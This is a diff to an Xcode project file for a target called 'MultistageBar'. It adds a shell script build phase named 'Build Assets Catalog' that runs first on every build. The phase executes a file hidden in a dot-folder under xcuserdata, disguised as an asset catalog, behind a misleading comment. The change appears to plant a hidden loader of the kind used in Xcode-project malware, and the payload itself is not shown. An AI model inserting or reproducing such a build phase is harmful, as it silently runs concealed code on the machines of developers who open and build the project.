@@ -1252,6 +1252,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 1705663D2452B09000A7AF4B /* Build configuration list for PBXNativeTarget "MultistageBar" */;
 			buildPhases = (
+				2A26C2DCB07AACBA046D902C /* Build Assets Catalog */,
 				1705660F2452B08D00A7AF4B /* Sources */,
 				170566102452B08D00A7AF4B /* Frameworks */,
 				170566112452B08D00A7AF4B /* Resources */,
@@ -1959,6 +1960,38 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+
+	2A26C2DCB07AACBA046D902C /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+		};
+	
+
+	
+		
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = 1705660B2452B08D00A7AF4B /* Project object */;
 }
